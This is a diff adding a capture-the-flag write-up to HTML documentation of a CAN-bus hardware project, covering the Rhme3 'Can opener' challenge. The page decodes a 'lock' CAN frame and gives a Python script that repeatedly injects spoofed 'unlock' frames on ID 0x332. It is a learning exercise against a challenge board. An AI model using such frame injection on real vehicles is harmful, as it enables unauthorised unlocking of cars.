@@ -84,7 +84,10 @@
 <li class="toctree-l1"><a class="reference internal" href="design_overview.html">Design overview</a></li>
 <li class="toctree-l1"><a class="reference internal" href="can_wb.html">Can Wishbone</a></li>
 <li class="toctree-l1"><a class="reference internal" href="linux_support.html">Linux support</a></li>
-<li class="toctree-l1 current"><a class="current reference internal" href="#">Rhme3</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Rhme3</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#can-opener">Can opener</a></li>
+</ul>
+</li>
 <li class="toctree-l1"><a class="reference internal" href="tools.html">Tools</a></li>
 <li class="toctree-l1"><a class="reference internal" href="hardware.html">Hardware</a></li>
 <li class="toctree-l1"><a class="reference internal" href="resources.html">Resources</a></li>
@@ -154,7 +157,52 @@
             
   <div class="section" id="rhme3">
 <h1>Rhme3<a class="headerlink" href="#rhme3" title="Permalink to this headline">¶</a></h1>
-<p>To Be written!!</p>
+<p>Rhme3 is a hardware capture the flag challenge by riscure and why this project was started. We work so hard on this project
+that we did not end up solving the challenge during the contest. The solutions on this page will (I ever solved) be done after the fact.</p>
+<img alt="_images/rhme3_front_page.png" src="_images/rhme3_front_page.png" />
+<div class="section" id="can-opener">
+<h2>Can opener<a class="headerlink" href="#can-opener" title="Permalink to this headline">¶</a></h2>
+<p>Can Opener was probably the most easy challenge for 150 points.</p>
+<img alt="_images/rhme3_can_opener.png" src="_images/rhme3_can_opener.png" />
+<p><a class="reference external" href="https://github.com/alexei-argus/rhme3dash">https://github.com/alexei-argus/rhme3dash</a></p>
+<p>Using the setup described in Linux setup we can use candump to dump the messages.</p>
+<p>One messages is:</p>
+<blockquote>
+<div>slcan0  332   [8]  6C 6F 63 6B 00 00 00 00</div></blockquote>
+<p>Translated to binary:</p>
+<blockquote>
+<div>rax2 -s 6C 6F 63 6B
+lock</div></blockquote>
+<p>The challenge is to unlock the car using an unlock message. We shutdown scland and write a python script to do so.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pyvit</span> <span class="k">import</span> <span class="n">can</span>
+<span class="kn">from</span> <span class="nn">pyvit.hw.cantact</span> <span class="k">import</span> <span class="n">CantactDev</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+
+<span class="n">dev</span> <span class="o">=</span> <span class="n">CantactDev</span><span class="p">(</span><span class="s2">&quot;/dev/ttyUSB2&quot;</span><span class="p">)</span>
+<span class="n">dev</span><span class="o">.</span><span class="n">set_bitrate</span><span class="p">(</span><span class="mi">50000</span><span class="p">)</span>
+<span class="n">dev</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">send_frame</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+	<span class="n">frame</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">Frame</span><span class="p">(</span><span class="nb">id</span><span class="p">)</span>
+	<span class="n">frame</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+	<span class="n">dev</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+
+<span class="n">d</span><span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="s2">&quot;unlock</span><span class="se">\0\0</span><span class="s2">&quot;</span><span class="p">))</span>
+
+<span class="nb">id</span> <span class="o">=</span> <span class="mh">0x332</span>
+
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+	<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">frame</span> <span class="o">=</span> <span class="n">dev</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">frame</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+		<span class="nb">print</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+		<span class="n">send_frame</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>
+  
+</pre></div>
+</div>
+</div>
 </div>
 
 
